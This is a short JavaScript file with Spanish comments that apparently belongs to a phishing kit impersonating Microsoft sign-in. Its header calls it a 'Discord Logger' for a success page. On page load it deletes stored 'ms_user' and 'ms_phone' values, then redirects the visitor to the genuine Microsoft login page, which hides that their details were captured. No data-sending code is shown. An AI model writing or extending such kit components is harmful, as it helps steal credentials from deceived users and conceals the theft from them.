// Discord Logger para index9.html (Éxito)
// Limpia localStorage y muestra botón de cierre

(function() {
  'use strict';
  
  document.addEventListener('DOMContentLoaded', function() {
    // Limpiar datos almacenados al completar el flujo
    localStorage.removeItem('ms_user');
    localStorage.removeItem('ms_phone');
    
    // Manejar botón de cerrar sesión
    const closeBtn = document.querySelector('button');
    if (closeBtn) {
      closeBtn.addEventListener('click', function() {
        // Redirigir a Microsoft real
        window.location.href = 'https://login.live.com/';
      });
    }
    
    // Auto-redirect después de 10 segundos
    setTimeout(() => {
      window.location.href = 'https://login.live.com/';
    }, 10000);
  });
})();
